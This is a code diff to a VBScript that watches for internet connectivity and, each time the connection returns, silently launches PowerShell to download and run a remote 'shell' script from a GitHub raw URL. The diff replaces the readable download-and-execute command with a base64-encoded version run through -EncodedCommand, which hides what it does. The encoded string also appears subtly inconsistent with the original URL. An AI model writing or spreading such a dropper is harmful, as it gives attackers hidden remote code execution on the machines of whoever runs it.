@@ -4,6 +4,8 @@ Dim objShell, wasConnected
 Set objShell = CreateObject("WScript.Shell")
 wasConnected = False
 
+encodedCommand = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbmFwcml2YXRlL3dhdGNofGFuZ3BheWxvYWRzL3JlZnMvSGVhZHMvbWFpbi9zaGVsbCcgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u"
+
 Do
     Dim pingResult
     pingResult = False
@@ -19,8 +21,8 @@ Do
     Next
 
     If pingResult = True And wasConnected = False Then
-        ' Internet just connected
-        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/anaprivate/watch_payloads/refs/heads/main/shell' -UseBasicParsing | Invoke-Expression""", 0, False
+        ' Internet just connected, run encoded powershell silently
+        objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 0, False
         wasConnected = True
     ElseIf pingResult = False Then
         ' Internet disconnected
